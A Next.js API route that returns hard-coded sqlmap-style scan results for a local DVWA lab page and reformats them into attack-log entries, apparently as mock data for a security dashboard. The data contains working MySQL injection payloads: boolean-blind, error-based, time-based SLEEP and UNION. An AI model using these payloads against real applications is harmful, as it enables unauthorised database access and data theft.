// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

export default function handler(req, res) {
  
    if (req.method === 'GET') {
        
    const response = 
    [
        {
            "data": [
                {
                    "status": 1,
                    "type": 0,
                    "value": {
                        "data": null,
                        "query": "id=7074&Submit=Submit",
                        "url": "http://localhost:8080/vulnerabilities/sqli/"
                    }
                },
                {
                    "status": 1,
                    "type": 1,
                    "value": [
                        {
                            "clause": [
                                1
                            ],
                            "conf": {
                                "code": null,
                                "notString": "Me",
                                "optimize": null,
                                "regexp": null,
                                "string": null,
                                "textOnly": null,
                                "titles": null
                            },
                            "data": {
                                "1": {
                                    "comment": "#",
                                    "falseCode": 200,
                                    "matchRatio": 0.969,
                                    "payload": "id=7074' OR NOT 8360=8360#&Submit=Submit",
                                    "templatePayload": null,
                                    "title": "OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)",
                                    "trueCode": 200,
                                    "vector": "OR NOT [INFERENCE]",
                                    "where": 1
                                },
                                "2": {
                                    "comment": "",
                                    "falseCode": null,
                                    "matchRatio": 0.969,
                                    "payload": "id=7074' OR (SELECT 2479 FROM(SELECT COUNT(*),CONCAT(0x7171787a71,(SELECT (ELT(2479=2479,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bQWx&Submit=Submit",
                                    "templatePayload": null,
                                    "title": "MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
                                    "trueCode": null,
                                    "vector": "OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                                    "where": 1
                                },
                                "5": {
                                    "comment": "",
                                    "falseCode": null,
                                    "matchRatio": 0.969,
                                    "payload": "id=7074' AND (SELECT 2455 FROM (SELECT(SLEEP([SLEEPTIME])))MOpi)-- pupp&Submit=Submit",
                                    "templatePayload": null,
                                    "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
                                    "trueCode": 200,
                                    "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
                                    "where": 1
                                },
                                "6": {
                                    "comment": "#",
                                    "falseCode": null,
                                    "matchRatio": 0.969,
                                    "payload": "id=7074' UNION ALL SELECT CONCAT(0x7171787a71,0x4c7356657165574642434a517658746b756d53464e7862584278697a5375765641754e5978577663,0x7170716b71),NULL#&Submit=Submit",
                                    "templatePayload": null,
                                    "title": "MySQL UNION query (NULL) - 1 to 20 columns",
                                    "trueCode": null,
                                    "vector": [
                                        0,
                                        2,
                                        "#",
                                        "'",
                                        "[GENERIC_SQL_COMMENT]",
                                        "NULL",
                                        1,
                                        false,
                                        null,
                                        null,
                                        null
                                    ],
                                    "where": 1
                                }
                            },
                            "dbms": "MySQL",
                            "dbms_version": [
                                ">= 5.0"
                            ],
                            "notes": [],
                            "os": null,
                            "parameter": "id",
                            "place": "GET",
                            "prefix": "'",
                            "ptype": 2,
                            "suffix": "[GENERIC_SQL_COMMENT]"
                        }
                    ]
                },
                {
                    "status": 1,
                    "type": 2,
                    "value": "back-end DBMS: MySQL >= 5.0 (MariaDB fork)"
                }
            ],
            "error": [],
            "success": true
        }
    ]

    function FilterSQL(result){

        var SQLLogs = []

        var current_time = new Date().getTime()
 
        
        try{

            let URL = result[0].data[0].value.url

            let data = result[0].data[1].value[0].data


            for( const key in  data){


                if (data.hasOwnProperty(key)) {
                    const item = data[key];
                    var log = {}
                    
                    log.AttackType = "sql"
                    log.Success = true
                    log.target_url = URL + "?" + item.payload
                    log.time = current_time
                    SQLLogs.push(log)


                }
                
                
                

                
                

            }

                    

                
                
            

        }
        catch(err){
            console.log(err)
        }

        console.log(SQLLogs)

        return SQLLogs
      }
            
  
    
  
      res.status(200).json(FilterSQL(response))
      
  
  
  
        
  
    }
  
  }
  